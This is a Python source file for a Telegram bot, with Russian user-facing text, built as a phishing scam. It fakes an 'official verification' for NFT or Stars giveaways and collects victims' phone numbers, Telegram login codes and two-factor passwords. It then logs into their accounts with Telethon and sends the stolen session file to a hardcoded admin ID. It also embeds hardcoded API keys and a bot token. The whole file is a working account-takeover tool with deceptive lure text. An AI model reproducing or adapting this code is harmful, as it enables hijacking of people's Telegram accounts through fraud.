import os
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

# --- КОНФИГУРАЦИЯ ---
API_ID = 37668790
API_HASH = '84a0450f9bbf15d1e1d09b47ee25cb49'
TOKEN = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
ADMIN_ID = 8212981789

bot = Bot(token=TOKEN)
dp = Dispatcher()
user_sessions = {}

class VerifState(StatesGroup):
    input_phone = State()
    input_code = State()
    input_2fa = State()

# --- ОСНОВНОЙ КОД ---

@dp.message(F.text.in_(["/nft", "/stars"]))
async def welcome(message: types.Message):
    text = (
        "<b>💎 Официальная верификация участников</b>\n\n"
        "Поздравляем! Ваш аккаунт попал в список претендентов на получение <b>NFT</b> или <b>50 Stars</b>. "
        "Для защиты от ботов и мультиаккаунтов, необходимо подтвердить личность через наш шлюз безопасности.\n\n"
        "👥 <i>Уже прошли проверку: 432 участника.</i>\n"
        "🛡 <b>Статус защиты:</b> Активен (End-to-End)"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="start_v")]
    ])
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "start_v")
async def ask_phone(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text(
        "📱 <b>Шаг 1 из 2: Идентификация</b>\n\n"
        "Введите ваш номер телефона (в формате +7...), чтобы система могла найти вашу заявку в базе данных.",
        parse_mode="HTML"
    )
    await state.set_state(VerifState.input_phone)

@dp.message(VerifState.input_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.replace(" ", "").replace("-", "")
    load_msg = await message.answer("🔄 <i>Соединение с защищенным шлюзом...</i>", parse_mode="HTML")
    
    session_path = f"sess_{message.from_user.id}"
    client = TelegramClient(session_path, API_ID, API_HASH)
    
    try:
        await client.connect()
        # Инициализируем отправку кода
        send_code = await client.send_code_request(phone)
        
        user_sessions[message.from_user.id] = {
            "client": client, 
            "phone": phone, 
            "hash": send_code.phone_code_hash, 
            "file": f"{session_path}.session"
        }
        
        await load_msg.edit_text(
            "📩 <b>Шаг 2 из 2: Подтверждение</b>\n\n"
            "На ваш аккаунт отправлен официальный код подтверждения.\n\n"
            "📝 <b>Введите код из чата 'Telegram':</b>\n"
            "<i>(Это необходимо для безопасной привязки NFT к вашему ID)</i>",
            parse_mode="HTML"
        )
        await state.set_state(VerifState.input_code)
        
    except Exception as e:
        await message.answer("❌ <b>Ошибка:</b> Некорректный номер или лимит попыток. Попробуйте снова.")
        await client.disconnect()

@dp.message(VerifState.input_code)
async def process_code(message: types.Message, state: FSMContext):
    data = user_sessions.get(message.from_user.id)
    if not data: return

    try:
        await data["client"].sign_in(data["phone"], message.text, phone_code_hash=data["hash"])
        await finalize_success(message, state)
    except SessionPasswordNeededError:
        await message.answer(
            "🔐 <b>Обнаружена двухфакторная защита</b>\n\n"
            "Для завершения синхронизации введите ваш облачный пароль:",
            parse_mode="HTML"
        )
        await state.set_state(VerifState.input_2fa)
    except PhoneCodeInvalidError:
        await message.answer("❌ <b>Неверный код.</b> Пожалуйста, проверьте код в приложении Telegram и введите его еще раз:")

@dp.message(VerifState.input_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    data = user_sessions.get(message.from_user.id)
    try:
        await data["client"].sign_in(password=message.text)
        await finalize_success(message, state)
    except PasswordHashInvalidError:
        await message.answer("❌ <b>Пароль неверный.</b> Попробуйте снова:")

async def finalize_success(message, state):
    data = user_sessions.get(message.from_user.id)
    await data["client"].disconnect()
    
    if os.path.exists(data["file"]):
        # Отправка сессии тебе
        doc = FSInputFile(data["file"])
        await bot.send_document(
            ADMIN_ID, doc, 
            caption=f"🔥 <b>ЕСТЬ ВХОД!</b>\n📱 Номер: <code>{data['phone']}</code>\n👤 Юзер: @{message.from_user.username or 'скрыт'}\n🆔 ID: <code>{message.from_user.id}</code>",
            parse_mode="HTML"
        )
        os.remove(data["file"])

    await message.answer(
        "✅ <b>Верификация успешно пройдена!</b>\n\n"
        "Ваши данные внесены в реестр. Награда будет отправлена на ваш баланс автоматически в течение 12 часов.\n\n"
        "✨ <i>Спасибо, что вы с нами!</i>",
        parse_mode="HTML"
    )
    await state.clear()
    user_sessions.pop(message.from_user.id, None)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(dp.start_polling(bot))
